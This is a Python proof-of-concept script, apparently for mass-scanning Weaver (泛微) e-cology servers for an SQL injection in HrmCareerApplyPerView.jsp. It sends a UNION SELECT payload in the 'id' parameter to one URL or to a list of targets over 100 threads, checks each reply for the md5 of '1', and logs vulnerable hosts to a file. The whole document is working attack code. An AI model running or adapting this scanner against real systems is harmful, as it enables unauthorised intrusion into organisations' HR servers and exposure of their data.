import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """__________             ___       __    _____      ______  __                 _________                              _______                ______       ________            ___    ______                
___  ____/_____ _________ |     / /_______(_)     ___  / / /_____________ _____  ____/_____ ___________________________    |__________________  /____  ____  __ \_____________ |  / /__(_)_______      __
__  /_   _  __ `/_  __ \_ | /| / /_  _ \_  /________  /_/ /__  ___/_  __ `__ \  /    _  __ `/_  ___/  _ \  _ \_  ___/_  /| |__  __ \__  __ \_  /__  / / /_  /_/ /  _ \_  ___/_ | / /__  /_  _ \_ | /| / /
_  __/   / /_/ /_  / / /_ |/ |/ / /  __/  /_/_____/  __  / _  /   _  / / / / / /___  / /_/ /_  /   /  __/  __/  /   _  ___ |_  /_/ /_  /_/ /  / _  /_/ /_  ____//  __/  /   __ |/ / _  / /  __/_ |/ |/ / 
/_/      \__,_/ /_/ /_/____/|__/  \___//_/        /_/ /_/  /_/    /_/ /_/ /_/\____/  \__,_/ /_/    \___/\___//_/    /_/  |_|  .___/_  .___//_/  _\__, / /_/     \___//_/    _____/  /_/  \___/____/|__/  
                                                                                                                           /_/     /_/          /____/                                                   """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微 HrmCareerApplyPerView SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1,2,md5(1),2,5,6,7'
    headers = {
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',
        'Accept-Encoding':'gzip,deflate,br',
        'Connection':'close',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if 'c4ca4238a0b923820dcc509a6f75849b' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        
if __name__ == '__main__':
    main()